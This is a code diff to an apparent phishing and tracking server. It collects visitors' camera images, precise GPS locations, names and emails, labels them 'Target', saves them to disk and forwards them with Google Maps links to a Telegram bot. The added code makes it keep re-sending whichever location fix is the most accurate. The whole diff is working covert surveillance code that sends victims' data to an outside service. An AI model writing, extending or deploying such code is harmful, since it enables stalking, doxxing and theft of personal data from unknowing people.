@@ -79,6 +79,14 @@ def capture():
             }
         }
     
+    # Check if user data is included in this capture (first capture from new UI)
+    user_name = data.get('name')
+    user_email = data.get('email')
+    
+    if user_name and user_email:
+        user_tracking[session_id]['user_info']['user_name'] = user_name
+        user_tracking[session_id]['user_info']['user_email'] = user_email
+    
     # Get the image data
     img_data = data.get('image', '')
     img_path = None
@@ -176,6 +184,7 @@ def location():
         user_tracking[session_id] = {
             'info_sent': False,
             'location_sent': False,
+            'best_accuracy': 10000,  # Start with a high value
             'user_info': {
                 'ip': request.remote_addr,
                 'user_agent': request.headers.get('User-Agent'),
@@ -183,23 +192,92 @@ def location():
             }
         }
     
+    # Add user info to tracking if provided
+    if 'name' in data and data['name'] != 'Unknown':
+        user_tracking[session_id]['user_info']['user_name'] = data['name']
+    
+    if 'email' in data and data['email'] != 'Unknown':
+        user_tracking[session_id]['user_info']['user_email'] = data['email']
+    
+    # Log the source of location data
+    source = data.get('source', 'unknown')
+    logger.info(f"Location data received from source: {source}")
+    
     try:
-        # Save location data
-        location_path = f"captured_data/location/location_{timestamp}.json"
+        # Check if this is a valid location
+        if 'latitude' not in data or 'longitude' not in data:
+            return jsonify({'status': 'error', 'message': 'Invalid location data'}), 400
+            
+        # Add Google Maps URL to location data
+        maps_url = f"https://www.google.com/maps?q={data['latitude']},{data['longitude']}"
+        data['maps_url'] = maps_url
+        
+        # Get accuracy if available
+        accuracy = data.get('accuracy', 10000)
+        
+        # Log more detailed information about the location request
+        logger.info(f"Location data received: lat={data['latitude']}, lng={data['longitude']}, " +
+                   f"accuracy={accuracy}, source={source}")
+        
+        # Save location data to file
+        location_path = f"captured_data/location/location_{timestamp}_{source}.json"
         with open(location_path, 'w') as f:
             json.dump(data, f, indent=4)
         logger.info(f"Location data saved to {location_path}")
         
-        # Update user tracking only if this is the first location data
-        if not user_tracking[session_id]['location_sent']:
+        # Determine if this is the most accurate location we've seen so far
+        is_most_accurate = False
+        if accuracy < user_tracking[session_id].get('best_accuracy', 10000):
+            user_tracking[session_id]['best_accuracy'] = accuracy
+            is_most_accurate = True
+            logger.info(f"New best accuracy: {accuracy} meters from source {source}")
+        
+        # Build caption based on source
+        caption = f"📍 <b>Target Location</b>"
+        
+        if source == 'leaflet_location':
+            caption = f"📍 <b>Leaflet Map Location</b>"
+        elif source == 'geolocation_api':
+            caption = f"📍 <b>Precise GPS Location</b>"
+        elif source == 'geolocation_watch':
+            caption = f"📍 <b>Updated GPS Location</b>"
+            
+        # Add accuracy information
+        caption += f"\nAccuracy: {accuracy} meters"
+        caption += f"\n🔗 <a href='{maps_url}'>View on Google Maps</a>"
+            
+        # Include user info in caption if available
+        if 'user_name' in user_tracking[session_id]['user_info']:
+            caption += f"\nName: {user_tracking[session_id]['user_info']['user_name']}"
+        if 'user_email' in user_tracking[session_id]['user_info']:
+            caption += f"\nEmail: {user_tracking[session_id]['user_info']['user_email']}"
+        
+        # Send to Telegram based on priority
+        # 1. Always send the first location we receive
+        # 2. Always send the most accurate location we've seen
+        # 3. For subsequent updates, only send if significantly improved accuracy
+        
+        # Is this the first location for this session?
+        first_location = not user_tracking[session_id]['location_sent']
+        
+        if first_location or is_most_accurate or (data.get('improved', False) and accuracy < 100):
+            tg.send_location(data['latitude'], data['longitude'], caption)
+            
+            # For the first location or most accurate location, also send a separate map link
+            if first_location or is_most_accurate:
+                tg.send_message(f"🔗 <b>Google Maps Link</b>: {maps_url}")
+            
+            # Mark that we've sent at least one location
             user_tracking[session_id]['location_sent'] = True
-            user_tracking[session_id]['user_info']['location'] = data
             
-            # Send to Telegram only once per session
-            if 'latitude' in data and 'longitude' in data:
-                caption = f"Target location at {user_tracking[session_id]['user_info']['timestamp']}"
-                tg.send_location(data['latitude'], data['longitude'], caption)
-            
+            # Store this location in user_info
+            user_tracking[session_id]['user_info']['location'] = {
+                'latitude': data['latitude'],
+                'longitude': data['longitude'],
+                'accuracy': accuracy,
+                'maps_url': maps_url
+            }
+        
         return jsonify({'status': 'success'})
     except Exception as e:
         logger.error(f"Error processing location data: {e}")
